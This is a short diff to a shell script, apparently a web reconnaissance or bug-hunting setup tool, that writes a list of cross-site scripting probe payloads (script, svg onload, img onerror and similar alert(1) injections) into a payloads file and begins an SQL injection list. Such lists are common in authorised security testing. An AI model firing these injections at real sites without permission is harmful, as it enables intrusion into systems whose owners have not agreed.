@@ -328,8 +328,7 @@ mkdir -p payloads recon_venom/confirmed
 
 # Payload sets
 mkdir -p payloads
-
-cat > payloads/xss.txt << 'EOF'
+cat << 'EOF' > payloads/xss.txt
 "><svg/onload=alert(1)>
 "><script>alert(1)</script>
 '><img src=x onerror=alert(1)>
@@ -339,6 +338,7 @@ cat > payloads/xss.txt << 'EOF'
 "><details/open/ontoggle=alert(1)>
 "><marquee/onstart=alert(1)>
 EOF
+
 
 
 cat > payloads/sqli.txt << 'EOF'
